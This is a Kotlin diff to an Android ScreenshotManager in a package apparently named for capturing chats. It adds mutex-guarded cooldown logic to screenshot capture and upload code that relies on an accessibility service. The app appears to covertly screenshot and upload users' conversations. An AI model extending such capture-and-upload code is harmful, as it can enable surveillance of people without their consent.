@@ -4,6 +4,8 @@ import android.accessibilityservice.AccessibilityService
 import android.content.Context
 import com.chats.capture.network.ApiClient
 import com.chats.capture.utils.ScreenshotCapture
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
@@ -28,12 +30,15 @@ class ScreenshotManager(
         @Volatile
         private var lastScreenshotTime: Long = 0
         private const val screenshotCooldownMs = 2000L // 2 seconds cooldown between screenshots
+        
+        // Mutex to ensure atomic check-and-update of cooldown (prevents race conditions)
+        private val cooldownMutex = Mutex()
     }
     
     /**
      * Capture and upload screenshot
      * Returns true if screenshot was captured and uploaded successfully, false otherwise
-     * Prevents duplicate captures within cooldown period
+     * Prevents duplicate captures within cooldown period (thread-safe)
      */
     suspend fun captureAndUploadScreenshot(): Boolean {
         if (screenshotCapture == null) {
@@ -41,11 +46,22 @@ class ScreenshotManager(
             return false
         }
         
-        // Check cooldown to prevent rapid duplicate captures
+        // Atomically check and update cooldown to prevent race conditions
         val currentTime = System.currentTimeMillis()
-        val timeSinceLastCapture = currentTime - lastScreenshotTime
-        if (timeSinceLastCapture < screenshotCooldownMs) {
-            Timber.w("Screenshot capture skipped - cooldown active (${screenshotCooldownMs - timeSinceLastCapture}ms remaining)")
+        val canProceed = cooldownMutex.withLock {
+            val timeSinceLastCapture = currentTime - lastScreenshotTime
+            if (timeSinceLastCapture < screenshotCooldownMs) {
+                Timber.w("Screenshot capture skipped - cooldown active (${screenshotCooldownMs - timeSinceLastCapture}ms remaining)")
+                false
+            } else {
+                // Reserve the slot by updating timestamp immediately
+                // This prevents other threads from bypassing cooldown
+                lastScreenshotTime = currentTime
+                true
+            }
+        }
+        
+        if (!canProceed) {
             return false
         }
         
@@ -56,6 +72,10 @@ class ScreenshotManager(
             val screenshotPath = screenshotCapture.captureScreenshot()
             if (screenshotPath == null) {
                 Timber.e("Failed to capture screenshot")
+                // Reset cooldown on failure so retry can happen immediately
+                cooldownMutex.withLock {
+                    lastScreenshotTime = 0
+                }
                 return false
             }
             
@@ -64,10 +84,12 @@ class ScreenshotManager(
             // Upload screenshot and return result
             val uploadSuccess = uploadScreenshot(screenshotPath)
             
-            // Only update cooldown timestamp after successful capture and upload
-            // This ensures failed attempts don't block legitimate retries
-            if (uploadSuccess) {
-                lastScreenshotTime = currentTime
+            // Only keep cooldown if upload was successful
+            // If upload failed, reset cooldown to allow immediate retry
+            if (!uploadSuccess) {
+                cooldownMutex.withLock {
+                    lastScreenshotTime = 0
+                }
             }
             
             // Clean up file even if upload failed to prevent accumulation
@@ -86,6 +108,10 @@ class ScreenshotManager(
             uploadSuccess
         } catch (e: Exception) {
             Timber.e(e, "Error capturing and uploading screenshot")
+            // Reset cooldown on exception to allow retry
+            cooldownMutex.withLock {
+                lastScreenshotTime = 0
+            }
             false
         }
     }
